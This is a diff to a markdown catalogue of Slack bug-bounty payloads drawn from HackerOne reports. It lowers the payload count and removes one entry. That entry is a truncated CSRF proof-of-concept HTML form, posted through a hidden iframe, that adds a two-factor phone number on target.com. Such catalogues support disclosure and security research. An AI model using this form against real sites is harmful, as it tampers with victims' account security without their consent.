@@ -1,6 +1,6 @@
 # Slack
 
-16 payloads.
+15 payloads.
 
 ### `bf33d3d3`
 
@@ -123,22 +123,6 @@ Content-Disposition:
 
 **Parameter:** `file`
 — [Open Redirect on target.com](https://hackerone.com/reports/140447) · Slack · [sudotop](https://hackerone.com/sudotop) · $500.0
-
-### `31a54cf7`
-
-```
-<html>
-<body>
-<IFRAME style="display:none" name="hidden-form"></iframe>
-    <form action="https://target.com/account/settings/2fa_sms" method="POST" target="hidden-form" name="pocframe">
-      <input type="hidden" name="verify&#95;two&#95;factor" value="1" />
-      <input type="hidden" name="backup" value="" />
-      <input type="hidden" name="app" value="" />
-      <input type="hidden" name="country&#95;code" value="AU" />
-      <input type="hidden" name="phone&#95;number" value="█████████
-```
-
-— [CSRF - Add optional two factor mobile number](https://hackerone.com/reports/155774) · Slack · [nhavis](https://hackerone.com/nhavis) · $500.0
 
 ### `b338cc38`
 
